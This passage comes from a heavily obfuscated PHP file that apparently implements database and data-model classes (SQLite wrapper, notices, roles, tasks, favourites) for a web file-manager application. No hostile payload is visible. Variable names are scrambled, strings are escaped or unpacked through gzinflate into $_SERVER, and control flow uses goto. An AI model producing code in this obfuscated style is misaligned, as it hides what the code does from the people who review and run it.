$ÔÎ €´¥) { $ÔÎ €´¥ = array_change_key_case($ÔÎ €´¥); $ÔÎ €´¥[$•Öï˜¹[42]] = isset($ÔÎ €´¥[$•Öï˜¹[42]]) ? $ÔÎ €´¥[$•Öï˜¹[42]] : $•Öï˜¹[382]; $ÔÎ €´¥[$•Öï˜¹[43]] = isset($ÔÎ €´¥[$•Öï˜¹[43]]) ? $ÔÎ €´¥[$•Öï˜¹[43]] : $•Öï˜¹[382]; $¼«åˆ = isset($ÔÎ €´¥[$•Öï˜¹[277]]) ? $ÔÎ €´¥[$•Öï˜¹[277]] : $ÔÎ €´¥[$•Öï˜¹[42]]; $Òª¢ ¿É[$¼«åˆ] = array($•Öï˜¹[42] => $¼«åˆ, $•Öï˜¹[43] => $ÔÎ €´¥[$•Öï˜¹[43]], $•Öï˜¹[45] => (bool) (isset($ÔÎ €´¥[$•Öï˜¹[114]]) && $ÔÎ €´¥[$•Öï˜¹[114]] === $•Öï˜¹[22] || isset($ÔÎ €´¥[$•Öï˜¹[45]]) && $ÔÎ €´¥[$•Öï˜¹[45]] === $•Öï˜¹[22]), $•Öï˜¹[47] => isset($ÔÎ €´¥[$•Öï˜¹[47]]) ? $ÔÎ €´¥[$•Öï˜¹[47]] : (isset($ÔÎ €´¥[$•Öï˜¹[66]]) ? $ÔÎ €´¥[$•Öï˜¹[66]] : $•Öï˜¹[382]), $•Öï˜¹[49] => isset($ÔÎ €´¥[$•Öï˜¹[105]]) ? strtolower($ÔÎ €´¥[$•Öï˜¹[105]]) == $•Öï˜¹[51] : (isset($ÔÎ €´¥[$•Öï˜¹[67]]) ? $ÔÎ €´¥[$•Öï˜¹[67]] : !1), $•Öï˜¹[52] => isset($ÔÎ €´¥[$•Öï˜¹[934]]) ? strtolower($ÔÎ €´¥[$•Öï˜¹[934]]) == $•Öï˜¹[54] : (isset($ÔÎ €´¥[$•Öï˜¹[105]]) ? $ÔÎ €´¥[$•Öï˜¹[105]] : !1)); } } return $Òª¢ ¿É; } public function getTables($–ÊÀá©¼ = '') { $°ù–®ŠÚ =& $_SERVER[¹àö™Ç¾]; if (think_config($°ù–®ŠÚ[935])) { $’šş˜ò = str_replace($°ù–®ŠÚ[936], $–ÊÀá©¼, think_config($°ù–®ŠÚ[935])); } else { switch ($this->dbType) { case $°ù–®ŠÚ[903]: case $°ù–®ŠÚ[905]: $’šş˜ò = $°ù–®ŠÚ[937]; break; case $°ù–®ŠÚ[902]: case $°ù–®ŠÚ[920]: $’šş˜ò = $°ù–®ŠÚ[938]; break; case $°ù–®ŠÚ[929]: $’šş˜ò = $°ù–®ŠÚ[939]; break; case $°ù–®ŠÚ[904]: think_exception(think_lang($°ù–®ŠÚ[940]) . $°ù–®ŠÚ[941]); break; case $°ù–®ŠÚ[921]: $’šş˜ò = $°ù–®ŠÚ[55] . $°ù–®ŠÚ[56] . $°ù–®ŠÚ[57]; break; case $°ù–®ŠÚ[932]: default: if (!empty($–ÊÀá©¼)) { $’šş˜ò = $°ù–®ŠÚ[884] . $–ÊÀá©¼ . $°ù–®ŠÚ[885]; } else { $’šş˜ò = $°ù–®ŠÚ[886]; } } } $ä‡¥íåÇ = $this->query($’šş˜ò); $Á´®åŸë = array(); foreach ($ä‡¥íåÇ as $Ÿ¿¿·çÏ => $úà­ËÆ®) { $Á´®åŸë[$Ÿ¿¿·çÏ] = current($úà­ËÆ®); } return $Á´®åŸë; } protected function parseLimit($ßã˜–Ç®) { $ÈèÊÜ¿¿ =& $_SERVER[¹àö™Ç¾]; $Çâ™È°É = $ÈèÊÜ¿¿[22]; if (!empty($ßã˜–Ç®)) { switch ($this->dbType) { case $ÈèÊÜ¿¿[929]: case $ÈèÊÜ¿¿[921]: $ßã˜–Ç® = explode($ÈèÊÜ¿¿[60], $ßã˜–Ç®); if (count($ßã˜–Ç®) > 1) { $Çâ™È°É .= $ÈèÊÜ¿¿[61] . $ßã˜–Ç®[1] . $ÈèÊÜ¿¿[62] . $ßã˜–Ç®[0] . $ÈèÊÜ¿¿[63]; } else { $Çâ™È°É .= $ÈèÊÜ¿¿[61] . $ßã˜–Ç®[0] . $ÈèÊÜ¿¿[63]; } break; case $ÈèÊÜ¿¿[902]: case $ÈèÊÜ¿¿[920]: break; case $ÈèÊÜ¿¿[904]: break; case $ÈèÊÜ¿¿[903]: case $ÈèÊÜ¿¿[905]: break; case $ÈèÊÜ¿¿[932]: default: $Çâ™È°É .= $ÈèÊÜ¿¿[61] . $ßã˜–Ç® . $ÈèÊÜ¿¿[63]; } } return $Çâ™È°É; } public function parseKey(&$ÓÅ®öì†, $ê¯ó« = true) { $³Ì¦ñ‡ò =& $_SERVER[¹àö™Ç¾]; if ($ê¯ó«) { $ÓÅ®öì† = $this->parseKeyCheck($ÓÅ®öì†); } if ($this->dbType == $³Ì¦ñ‡ò[932]) { if ($ÓÅ®öì† != $³Ì¦ñ‡ò[191] && !preg_match($³Ì¦ñ‡ò[896], $ÓÅ®öì†)) { $ÓÅ®öì† = $³Ì¦ñ‡ò[389] . trim($ÓÅ®öì†, $³Ì¦ñ‡ò[389]) . $³Ì¦ñ‡ò[389]; } return $ÓÅ®öì†; } else { return parent::parseKey($ÓÅ®öì†, $ê¯ó«); } } public function close() { $this->_linkID = null; } public function error() { $ô®õÒ† =& $_SERVER[¹àö™Ç¾]; if ($this->PDOStatement) { $¹ö¬İ³ = $this->PDOStatement->errorInfo(); $this->error = $¹ö¬İ³[1] . $ô®õÒ†[4] . $¹ö¬İ³[2]; } else { $this->error = $ô®õÒ†[22]; } if ($ô®õÒ†[22] != $this->queryStr) { $this->error .= LNG($ô®õÒ†[58]) . $this->queryStr; } think_trace($this->error, $ô®õÒ†[22], $ô®õÒ†[59]); return $this->error; } public function escapeString($ò¼”¥û) { $òŒ†„³‚ =& $_SERVER[¹àö™Ç¾]; switch ($this->dbType) { case $òŒ†„³‚[929]: case $òŒ†„³‚[902]: case $òŒ†„³‚[920]: case $òŒ†„³‚[932]: return addslashes($ò¼”¥û); case $òŒ†„³‚[904]: case $òŒ†„³‚[921]: case $òŒ†„³‚[903]: case $òŒ†„³‚[905]: return str_ireplace($òŒ†„³‚[68], $òŒ†„³‚[69], $ò¼”¥û); } } protected function parseValue($Æ¾ƒÏ¾â) { $û‹êû¥™ =& $_SERVER[¹àö™Ç¾]; if (is_string($Æ¾ƒÏ¾â)) { $³ëÎÉ… = strpos($Æ¾ƒÏ¾â, $û‹êû¥™[4]) === 0 && in_array($Æ¾ƒÏ¾â, array_keys($this->bind)); $Æ¾ƒÏ¾â = $³ëÎÉ… ? $this->escapeString($Æ¾ƒÏ¾â) : $û‹êû¥™[942] . $this->escapeString($Æ¾ƒÏ¾â) . $û‹êû¥™[942]; } elseif (isset($Æ¾ƒÏ¾â[0]) && is_string($Æ¾ƒÏ¾â[0]) && strtolower($Æ¾ƒÏ¾â[0]) == $û‹êû¥™[301]) { $Æ¾ƒÏ¾â = $this->escapeString($Æ¾ƒÏ¾â[1]); } elseif (is_array($Æ¾ƒÏ¾â)) { $Æ¾ƒÏ¾â = array_map(array($this, $û‹êû¥™[943]), $Æ¾ƒÏ¾â); } elseif (is_bool($Æ¾ƒÏ¾â)) { $Æ¾ƒÏ¾â = $Æ¾ƒÏ¾â ? $û‹êû¥™[99] : $û‹êû¥™[200]; } elseif (is_null($Æ¾ƒÏ¾â)) { $Æ¾ƒÏ¾â = $û‹êû¥™[114]; } return $Æ¾ƒÏ¾â; } public function getLastInsertId() { $¼ãöïóŸ =& $_SERVER[¹àö™Ç¾]; switch ($this->dbType) { case $¼ãöïóŸ[929]: case $¼ãöïóŸ[921]: case $¼ãöïóŸ[902]: case $¼ãöïóŸ[920]: case $¼ãöïóŸ[904]: case $¼ãöïóŸ[932]: return $this->_linkID->lastInsertId(); case $¼ãöïóŸ[903]: case $¼ãöïóŸ[905]: $ÇûÍ†’ = $this->table; $–ºª¼„Ù = $this->query("\123\x45\x4c\x45\x43\x54\40{$ÇûÍ†’}\x2e\143\x75\162\x72\166\141\x6c\40\x63\x75\x72\162\166\141\154\x20\x46\122\117\x4d\40\x64\x75\141\x6c"); return $–ºª¼„Ù ? $–ºª¼„Ù[0][$¼ãöïóŸ[944]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÏĞñà¸î) { $£Ó¨‰ò =& $_SERVER[¹àö™Ç¾]; if (!CacheLock::fileLock($£Ó¨‰ò[23])) { return !1; } $”øàŠû = parent::query($ÏĞñà¸î); CacheLock::fileUnLock($£Ó¨‰ò[23]); return $”øàŠû; } public function execute($Ëßä«’Ú) { $û÷úéíœ =& $_SERVER[¹àö™Ç¾]; if (!CacheLock::fileLock($û÷úéíœ[23])) { return !1; } $ ¨”´›¢ = parent::execute($Ëßä«’Ú); CacheLock::fileUnLock($û÷úéíœ[23]); return $ ¨”´›¢; } } goto dàØ±ÜâÆ·; CÎœïÕ©Î: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x6e\x6f\x74\x69\143\145\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x63\x6f\156\x74\145\x6e\x74", "\141\x75\x74\x68", "\x6d\157\x64\145", "\164\x69\x6d\x65", "\x74\x79\160\x65", "\x6c\x65\166\x65\154", "\x65\156\x61\142\154\145", "\x73\157\x72\x74"); public function listData($Œ½Ğå—õ = false, $áÆ½ò´¸ = "\x73\157\x72\x74", $‰ş¨¸»š = false) { return parent::listData($Œ½Ğå—õ, $áÆ½ò´¸, $‰ş¨¸»š); } public function add($ Ÿ‰Ú‰º) { $ï¼¨ÀÉù =& $_SERVER[¹àö™Ç¾]; $…•ÍòÏ = time(); if ($ Ÿ‰Ú‰º[$ï¼¨ÀÉù[26]] == $ï¼¨ÀÉù[2221]) { $…•ÍòÏ = strtotime($ Ÿ‰Ú‰º[$ï¼¨ÀÉù[206]]); } $ Ÿ‰Ú‰º[$ï¼¨ÀÉù[206]] = $…•ÍòÏ; return parent::insert($ Ÿ‰Ú‰º); } public function update($—ğ£üì›, $îøÏ×§) { $à›‰›àä =& $_SERVER[¹àö™Ç¾]; $´Âİí›¸ = $this->listData($—ğ£üì›); if (!$´Âİí›¸) { return !1; } $·ıÎ‰‘‹ = time(); if ($îøÏ×§[$à›‰›àä[26]] == $à›‰›àä[2221]) { $·ıÎ‰‘‹ = strtotime($îøÏ×§[$à›‰›àä[206]]); } $îøÏ×§[$à›‰›àä[206]] = $·ıÎ‰‘‹; return parent::update($—ğ£üì›, $îøÏ×§); } public function remove($Ì±Ú°Ç) { $¨æ«„£ = $this->listData($Ì±Ú°Ç); if (!$¨æ«„£ || $¨æ«„£[$_SERVER[¹àö™Ç¾][1259]]) { return !1; } return parent::remove($Ì±Ú°Ç); } public function sort($¬ò­ºäå, $¾®­”Æ¤) { return parent::update($¬ò­ºäå, $¾®­”Æ¤); } public function enable($çûÕË, $Ôìù‹§Ù) { return parent::update($çûÕË, array($_SERVER[¹àö™Ç¾][2222] => $Ôìù‹§Ù)); } private function initUserOption() { $ èå¶É´ =& $_SERVER[¹àö™Ç¾]; $this->optionType = $ èå¶É´[2223]; $this->modelType = $ èå¶É´[2224]; $this->field = array($ èå¶É´[2225], $ èå¶É´[42], $ èå¶É´[206], $ èå¶É´[43], $ èå¶É´[2226], $ èå¶É´[742], $ èå¶É´[198]); } public function userNoticeGet($˜İğÎÏÔ = false) { $this->initUserOption(); return parent::listData($˜İğÎÏÔ, $_SERVER[¹àö™Ç¾][401], !0); } public function userNoticeAdd($œ†ñÛı°) { $İÒõòš™ =& $_SERVER[¹àö™Ç¾]; $this->initUserOption(); $¹š±¹ = $this->findByKey($İÒõòš™[2225], $œ†ñÛı°[$İÒõòš™[401]]); if ($¹š±¹) { return !0; } $Œ¨€· = array($İÒõòš™[2225] => $œ†ñÛı°[$İÒõòš™[401]], $İÒõòš™[42] => $œ†ñÛı°[$İÒõòš™[42]], $İÒõòš™[206] => $œ†ñÛı°[$İÒõòš™[206]], $İÒõòš™[43] => isset($œ†ñÛı°[$İÒõòš™[43]]) ? $œ†ñÛı°[$İÒõòš™[43]] : 1, $İÒõòš™[2226] => isset($œ†ñÛı°[$İÒõòš™[2226]]) ? $œ†ñÛı°[$İÒõòš™[2226]] : 0, $İÒõòš™[742] => 0, $İÒõòš™[198] => 0); return parent::insert($Œ¨€·); } public function userNoticeEdit($Õ½¾ÃÀã, $ª”æÃØ¹) { $this->initUserOption(); return parent::update($Õ½¾ÃÀã, $ª”æÃØ¹); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\155\137\x6f\x70\164\x69\x6f\x6e"; protected $jsonField = array("\155\145\156\165", "\162\157\x6c\x65", "\x72\x6f\x6c\x65\x47\162\157\x75\160", "\162\x65\147\x69\163\164", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($³éÍçÏ¼) { return "\123\x79\163\x74\x65\x6d\117\160\x74\x69\x6f\x6e\x5f{$³éÍçÏ¼}"; } protected function optionDefault($ãê…«’ = '') { $’ÌïÁ¹® =& $_SERVER[¹àö™Ç¾]; if ($ãê…«’ == $’ÌïÁ¹®[22]) { return $GLOBALS[$’ÌïÁ¹®[16]][$’ÌïÁ¹®[385]]; } } } class SystemRecordModel extends ModelBaseLight { } goto eã›ªŠ‡ó”; eã›ªŠ‡ó”: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x72\157\x6c\145\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\x61\x75\x74\150", "\154\141\x62\x65\x6c", "\144\x69\x73\x70\x6c\x61\x79", "\x73\171\x73\x74\145\x6d", "\144\145\163\143", "\151\147\156\157\x72\x65\x45\x78\164", "\151\147\156\157\x72\145\x46\151\154\x65\123\151\172\x65", "\x61\x64\155\x69\156\x69\x73\x74\162\141\x74\x6f\162", "\x73\157\162\x74"); public function listData($û­Ìèğ = false, $±éÌİ¬· = "\163\157\x72\x74", $¿˜Ûé±¯ = false) { $¿¾­Ÿ¥ê =& $_SERVER[¹àö™Ç¾]; $µñµ«Æ› = parent::listData($û­Ìèğ, $±éÌİ¬·, $¿˜Ûé±¯); if (!$û­Ìèğ) { foreach ($µñµ«Æ› as $Ğ¿¶ıÃá => $ÎÚ¾†ñ†) { if ($ÎÚ¾†ñ†[$¿¾­Ÿ¥ê[2001]] == 1) { $µñµ«Æ›[$Ğ¿¶ıÃá][$¿¾­Ÿ¥ê[451]] = LNG($¿¾­Ÿ¥ê[2227]); } } } return $µñµ«Æ›; } public function update($ÏÇ§Õı, $Ùà“Ÿ‡¤) { $µµ…ŠÙ =& $_SERVER[¹àö™Ç¾]; $â«ù·½– = parent::listData($ÏÇ§Õı); $ı™öÒÀ€ = $this->findByName($Ùà“Ÿ‡¤[$µµ…ŠÙ[42]]); if (!$â«ù·½– || $ı™öÒÀ€ && $ı™öÒÀ€[$µµ…ŠÙ[401]] != $â«ù·½–[$µµ…ŠÙ[401]]) { return !1; } if ($ı™öÒÀ€[$µµ…ŠÙ[2001]] == 1) { $Ùà“Ÿ‡¤ = array($µµ…ŠÙ[42] => $Ùà“Ÿ‡¤[$µµ…ŠÙ[42]], $µµ…ŠÙ[1830] => $Ùà“Ÿ‡¤[$µµ…ŠÙ[1830]]); } $this->filterAuth($Ùà“Ÿ‡¤[$µµ…ŠÙ[414]]); return parent::update($ÏÇ§Õı, $Ùà“Ÿ‡¤); } public function remove($¥ºñÊÚ°) { $õÅÔ÷ = parent::listData($¥ºñÊÚ°); if (!$õÅÔ÷ || $õÅÔ÷[$_SERVER[¹àö™Ç¾][1259]]) { return !1; } return parent::remove($¥ºñÊÚ°); } public function add($¾½–¯¤ş) { $‹¬ƒ±ÏÓ =& $_SERVER[¹àö™Ç¾]; $³Âõ¨¾ö = $¾½–¯¤ş[$‹¬ƒ±ÏÓ[42]]; if ($this->findByName($³Âõ¨¾ö)) { return !1; } $ÒÀ›¡°› = array($‹¬ƒ±ÏÓ[421] => $³Âõ¨¾ö, $‹¬ƒ±ÏÓ[1814] => $‹¬ƒ±ÏÓ[22], $‹¬ƒ±ÏÓ[1810] => $‹¬ƒ±ÏÓ[1818], $‹¬ƒ±ÏÓ[2228] => 1, $‹¬ƒ±ÏÓ[1813] => 0, $‹¬ƒ±ÏÓ[2229] => 0, $‹¬ƒ±ÏÓ[1812] => $this->getSort()); $¾½–¯¤ş = array_merge($ÒÀ›¡°›, $¾½–¯¤ş); $this->filterAuth($¾½–¯¤ş[$‹¬ƒ±ÏÓ[414]]); return parent::insert($¾½–¯¤ş); } private function getSort() { $»¤ß»‡‰ =& $_SERVER[¹àö™Ç¾]; $ú®Ò¼ó = parent::listData(); $ÂŠ¹Íê± = array_to_keyvalue($ú®Ò¼ó, $»¤ß»‡‰[22], $»¤ß»‡‰[1831]); return empty($ÂŠ¹Íê±) ? 0 : max($ÂŠ¹Íê±) + 1; } private function filterAuth(&$¬ıÄ…ëÙ) { $•¥¯ü¶â =& $_SERVER[¹àö™Ç¾]; $«±¬¼³Å = array(); $ª—¯ğ¢‚ = array_filter(explode($•¥¯ü¶â[60], $¬ıÄ…ëÙ)); foreach ($ª—¯ğ¢‚ as $¬ıÄ…ëÙ) { $ª›’±¸˜ = explode($•¥¯ü¶â[20], $¬ıÄ…ëÙ); if ($ª›’±¸˜[0] == $•¥¯ü¶â[2230] && $ª›’±¸˜[1] != $•¥¯ü¶â[1178]) { $ÑóÛ¹öŠ = $ª›’±¸˜[0] . $•¥¯ü¶â[20] . $ª›’±¸˜[1] . $•¥¯ü¶â[2231]; if (!in_array($ÑóÛ¹öŠ, $ª—¯ğ¢‚)) { $«±¬¼³Å[] = $ÑóÛ¹öŠ; } } $«±¬¼³Å[] = $¬ıÄ…ëÙ; } $¬ıÄ…ëÙ = implode($•¥¯ü¶â[60], $«±¬¼³Å); } public function sort($©ÂĞÔŞª, $üŸ–­Ò•) { return parent::update($©ÂĞÔŞª, $üŸ–­Ò•); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x74\141\163\x6b\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\164\x79\160\145", "\x65\x76\145\x6e\x74", "\164\x69\x6d\x65", "\144\145\163\143", "\163\x79\163\164\x65\155", "\145\x6e\141\x62\x6c\x65", "\x6c\x61\163\164\x52\165\156", "\x73\x6f\162\x74"); public function listData($Â—Ö¿’˜ = false, $…»Óèªë = "\163\157\x72\164", $ŸøîŠĞÎ = false) { return parent::listData($Â—Ö¿’˜, $…»Óèªë, $ŸøîŠĞÎ); } public function add($ï°Ğâø) { $†…èÒ  =& $_SERVER[¹àö™Ç¾]; $Å«¯§¿Ï = $this->findByName($ï°Ğâø[$†…èÒ [42]]); if ($Å«¯§¿Ï) { return !1; } $ï°Ğâø[$†…èÒ [1601]] = 0; $ï°Ğâø[$†…èÒ [1831]] = $this->getSort(); return parent::insert($ï°Ğâø); } private function getSort() { $°¥ûÓ¥ =& $_SERVER[¹àö™Ç¾]; $Ó‘ØÎÚİ = parent::listData(); $Ô“ö–éÏ = array_to_keyvalue($Ó‘ØÎÚİ, $°¥ûÓ¥[22], $°¥ûÓ¥[1831]); return empty($Ô“ö–éÏ) ? 0 : max($Ô“ö–éÏ) + 1; } public function update($Ò¨‹¢Œ, $üÛ¨«¢°) { $öØİÅßÂ =& $_SERVER[¹àö™Ç¾]; $“ƒ¨Æ = $this->listData($Ò¨‹¢Œ); $ˆÏ‘ôú = $this->findByName($üÛ¨«¢°[$öØİÅßÂ[42]]); if (!$“ƒ¨Æ || $ˆÏ‘ôú && $ˆÏ‘ôú[$öØİÅßÂ[401]] != $“ƒ¨Æ[$öØİÅßÂ[401]]) { return !1; } return parent::update($Ò¨‹¢Œ, $üÛ¨«¢°); } public function remove($ÇÓÃœéÇ, $÷ªˆ·Û = false) { $‘Ì¦¨Åå =& $_SERVER[¹àö™Ç¾]; $ÃÎ•Ê¾Í = $this->listData($ÇÓÃœéÇ); if (!$ÃÎ•Ê¾Í) { return; } if (!$÷ªˆ·Û && $ÃÎ•Ê¾Í[$‘Ì¦¨Åå[1259]] == $‘Ì¦¨Åå[99]) { return !1; } return parent::remove($ÇÓÃœéÇ); } public function enable($®ÄœØ³, $š‡ÕŞâ) { return $this->update($®ÄœØ³, array($_SERVER[¹àö™Ç¾][2222] => $š‡ÕŞâ)); } public function run($ŸêÕ‘êŒ) { return $this->update($ŸêÕ‘êŒ, array($_SERVER[¹àö™Ç¾][2232] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($Û¦ğå¸) { $‰Ã«´° =& $_SERVER[¹àö™Ç¾]; return array($‰Ã«´°[1916] => array(USER_ID, $‰Ã«´°[2233])); } protected function listData() { $“ÕÖÖÊ¼ =& $_SERVER[¹àö™Ç¾]; $Ñ«–‘çû = array($“ÕÖÖÊ¼[1631] => USER_ID, $“ÕÖÖÊ¼[483] => 0); $„çÍº = $“ÕÖÖÊ¼[2234]; $Í˜Œôò  = $this->field($„çÍº)->where($Ñ«–‘çû)->order($“ÕÖÖÊ¼[2235])->select(); return $Í˜Œôò  ? $Í˜Œôò  : array(); } protected function resetCache() { } protected function listView() { $Ñ„‡›©â =& $_SERVER[¹àö™Ç¾]; $ó€Ì¤Ş = $this->listData(); $—æÙĞô = array_filter_by_field($ó€Ì¤Ş, $Ñ„‡›©â[43], $Ñ„‡›©â[417]); $ÓÆ ß†ù = array_to_keyvalue($—æÙĞô, $Ñ„‡›©â[22], $Ñ„‡›©â[88]); if (!$ÓÆ ß†ù) { return $ó€Ì¤Ş; } $Ê°ñš‘« = 2000; $âš²¯ö = array($Ñ„‡›©â[418] => array($Ñ„‡›©â[419], $ÓÆ ß†ù)); $ ¼ëëµ· = Model($Ñ„‡›©â[817])->listSource($âš²¯ö, $Ê°ñš‘«); $ ¼ëëµ· = array_merge($ ¼ëëµ·[$Ñ„‡›©â[86]], $ ¼ëëµ·[$Ñ„‡›©â[87]]); $ ¼ëëµ· = array_to_keyvalue($ ¼ëëµ·, $Ñ„‡›©â[403]); foreach ($ó€Ì¤Ş as $ç•Å“Ï­ => $¿ö§ıß¾) { $”À‚‰˜‰ = $ ¼ëëµ·[$¿ö§ıß¾[$Ñ„‡›©â[88]]]; $”À‚‰˜‰ = $”À‚‰˜‰ ? $”À‚‰˜‰ : array(); $ó€Ì¤Ş[$ç•Å“Ï­] = array_merge($”À‚‰˜‰, $¿ö§ıß¾); } return $ó€Ì¤Ş; } protected function addFav($âÚ„Îæ×, $‘åçò›é = '', $—Á™ÅªÖ = "\x73\x6f\165\x72\143\x65") { $Ê”ìäşª =& $_SERVER[¹àö™Ç¾]; $¬¦÷ïìª = array($Ê”ìäşª[1631] => USER_ID, $Ê”ìäşª[483] => 0, $Ê”ìäşª[423] => $—Á™ÅªÖ, $Ê”ìäşª[422] => $âÚ„Îæ×); if ($this->where($¬¦÷ïìª)->find()) { return !1; } $¬¦÷ïìª = array($Ê”ìäşª[1631] => USER_ID, $Ê”ìäşª[483] => 0); $Íªº“À  = $this->where($¬¦÷ïìª)->max($Ê”ìäşª[1831]); if (!$Íªº“À ) { $Íªº“À  = 0; } if (!$‘åçò›é && $—Á™ÅªÖ == $Ê”ìäşª[417]) { $ÎÊï™‹ = Model($Ê”ìäşª[1310])->where(array($Ê”ìäşª[418] => $âÚ„Îæ×))->find(); if (!$ÎÊï™‹) { return !1; } $‘åçò›é = $ÎÊï™‹[$Ê”ìäşª[42]]; } $‘åçò›é = $this->getAutoName($‘åçò›é); $à¼ÆĞğë = array($Ê”ìäşª[1631] => USER_ID, $Ê”ìäşª[483] => 0, $Ê”ìäşª[421] => $‘åçò›é, $Ê”ìäşª[422] => $âÚ„Îæ×, $Ê”ìäşª[423] => $—Á™ÅªÖ, $Ê”ìäşª[1812] => $Íªº“À  + 1); return $this->add($à¼ÆĞğë); } protected function remove($Ôµä¤‰è) { $ãÀ¹´¦… =& $_SERVER[¹àö™Ç¾]; $´À™Ÿªô = array($ãÀ¹´¦…[1631] => USER_ID, $ãÀ¹´¦…[420] => $Ôµä¤‰è); return $this->where($´À™Ÿªô)->delete(); } protected function removeByName($«ÇÀÓ½”) { $¶å¼üñü =& $_SERVER[¹àö™Ç¾]; $ÓôÂÊ…© = array($¶å¼üñü[1631] => USER_ID, $¶å¼üñü[421] => $«ÇÀÓ½”, $¶å¼üñü[483] => 0); return $this->where($ÓôÂÊ…©)->delete(); } protected function rename($ªÓ¾²ØÖ, $ ¢±Û÷) { $³´û…Ÿ =& $_SERVER[¹àö™Ç¾]; if ($ªÓ¾²ØÖ == $ ¢±Û÷) { return !1; } $ı•‰½ºš = $this->getAutoName($ ¢±Û÷); if ($ ¢±Û÷ != $ı•‰½ºš) { return !1; } $Â•ÉÎ¬ß = array($³´û…Ÿ[1631] => USER_ID, $³´û…Ÿ[483] => 0, $³´û…Ÿ[42] => $ªÓ¾²ØÖ); return $this->where($Â•ÉÎ¬ß)->save(array($³´û…Ÿ[42] => $ ¢±Û÷)); } protected function resetSort($†äªŸ¼) { $öÊ‰ÌÜö =& $_SERVER[¹àö™Ç¾]; $†äªŸ¼ = is_array($†äªŸ¼) ? $†äªŸ¼ : array(); $±Ç¨ô¸® = array($öÊ‰ÌÜö[1631] => USER_ID); for ($òÊë¾„ = 0; $òÊë¾„ < count($†äªŸ¼); $òÊë¾„++) { $±Ç¨ô¸®[$öÊ‰ÌÜö[420]] = $†äªŸ¼[$òÊë¾„]; $this->where($±Ç¨ô¸®)->save(array($öÊ‰ÌÜö[1812] => $òÊë¾„ + 1)); } return !0; } protected function moveTop($Ëª±àßš) { $Üß‡õƒ¨ =& $_SERVER[¹àö™Ç¾]; $„úÕ½øå = array($Üß‡õƒ¨[1631] => USER_ID, $Üß‡õƒ¨[483] => 0); $šâÄœÏó = $this->where($„úÕ½øå)->where(array($Üß‡õƒ¨[42] => $Ëª±àßš))->find(); if (!$šâÄœÏó) { return; } $ÙŒ”ü¯³ = $this->field($Üß‡õƒ¨[401])->where($„úÕ½øå)->order($Üß‡õƒ¨[2235])->select(); $ÙŒ”ü¯³ = array_to_keyvalue($ÙŒ”ü¯³, $Üß‡õƒ¨[22], $Üß‡õƒ¨[401]); $¥ÆÁÔş™ = $ÙŒ”ü¯³; $ÙŒ”ü¯³ = array_remove_value($ÙŒ”ü¯³, $šâÄœÏó[$Üß‡õƒ¨[401]]); array_unshift($ÙŒ”ü¯³, $šâÄœÏó[$Üß‡õƒ¨[401]]); return $this->resetSort($ÙŒ”ü¯³); } protected function moveBottom($ŠÚÍÕ­“) { $•é’ØÎ— =& $_SERVER[¹àö™Ç¾]; $°šñî¢ = array($•é’ØÎ—[1631] => USER_ID, $•é’ØÎ—[483] => 0); $åõ¿„‹ = $this->where($°šñî¢)->max($•é’ØÎ—[1831]); $ç‰¬ç¼æ = array($•é’ØÎ—[1831] => $åõ¿„‹ + 1); return $this->where($°šñî¢)->where(array($•é’ØÎ—[42] => $ŠÚÍÕ­“))->save($ç‰¬ç¼æ); } private function getAutoName($Ô¢Æİ„) { $õûæ–åŠ =& $_SERVER[¹àö™Ç¾]; $ÖÊšÕ« = array($õûæ–åŠ[1631] => USER_ID, $õûæ–åŠ[483] => 0); $™¹À¨µÅ = $this->field($õûæ–åŠ[42])->where($ÖÊšÕ«)->select(); $™¹À¨µÅ = array_to_keyvalue($™¹À¨µÅ, $õûæ–åŠ[22], $õûæ–åŠ[42]); if (!$™¹À¨µÅ || !in_array($Ô¢Æİ„, $™¹À¨µÅ)) { return $Ô¢Æİ„; } for ($ŠÔª·¨ = 0; $ŠÔª·¨ < count($™¹À¨µÅ); $ŠÔª·¨++) { if (!in_array($Ô¢Æİ„ . "\50{$ŠÔª·¨}\x29", $™¹À¨µÅ)) { return $Ô¢Æİ„ . "\x28{$ŠÔª·¨}\51"; } } return $Ô¢Æİ„ . "\50{$ŠÔª·¨}\x29"; } } goto döÏÙ Â‹; BŞ‚É¡õµ: define($_SERVER[¹àö™Ç¾][0], $_SERVER[¹àö™Ç¾][1]); $_SERVER[‡µõ°¨¾] = explode($_SERVER[¹àö™Ç¾][2], gzinflate(substr($_SERVER[¹àö™Ç¾][3], 10, -8))); function binCheckEq($ĞçÄóÜ·, $¤üØ©™ª) { return $ĞçÄóÜ· == $¤üØ©™ª; } goto EÊÕ«Á†˜ñ; döÏÙ Â‹: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x6a\157\x62\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x64\145\x73\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\145\154\146\x4a\157\x62\114\151\163\164"; public function listData($éÕÄç£ = false, $•”íÄõ¥ = "\163\157\x72\x74", $óÛÆşîş = false) { return parent::listData($éÕÄç£, $•”íÄõ¥, $óÛÆşîş); } public function remove($©ÄÔŸÏû) { return parent::remove($©ÄÔŸÏû); } public function add($ÀÈ¬€ˆ³) { $ÌØÑÑô =& $_SERVER[¹àö™Ç¾]; if ($this->findByName($ÀÈ¬€ˆ³[$ÌØÑÑô[42]])) { return !1; } $ÀÈ¬€ˆ³[$ÌØÑÑô[1831]] = $this->getSort(); return parent::insert($ÀÈ¬€ˆ³); } private function getSort() { $Å‘óÙÎ† =& $_SERVER[¹àö™Ç¾]; $ã·íÌÖÙ = parent::listData(); $ö‹Ûİ† = array_to_keyvalue($ã·íÌÖÙ, $Å‘óÙÎ†[22], $Å‘óÙÎ†[1831]); return empty($ö‹Ûİ†) ? 0 : max($ö‹Ûİ†) + 1; } public function update($‹ò‹µ²‘, $½ğçºì) { $¬ßşÙÑ¸ =& 